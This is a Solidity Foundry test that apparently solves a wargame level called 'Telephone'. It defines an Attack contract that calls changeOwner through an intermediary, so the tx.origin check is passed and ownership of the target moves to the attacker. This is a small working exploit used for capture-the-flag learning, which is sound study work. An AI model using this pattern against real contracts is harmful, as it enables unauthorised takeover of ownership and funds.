// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/04_Telephone.sol";

contract TelephoneTest is Test {
    Telephone instance;
    Attack attacker;
    address player1;
    address player2;

    function setUp() public {
        player1 = vm.addr(1);
        vm.startPrank(player1);
        instance = new Telephone();
        vm.stopPrank();
        player2 = vm.addr(2);
        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        vm.startPrank(player2);
        vm.assertEq(instance.owner(), address(player1));
        attacker.attack();
        vm.assertEq(instance.owner(), address(player2));
        vm.stopPrank();
    }
}

contract Attack {
    Telephone instance;

    constructor(address fb) {
        instance = Telephone(fb);
    }

    function attack() public {
        instance.changeOwner(msg.sender);
    }
}
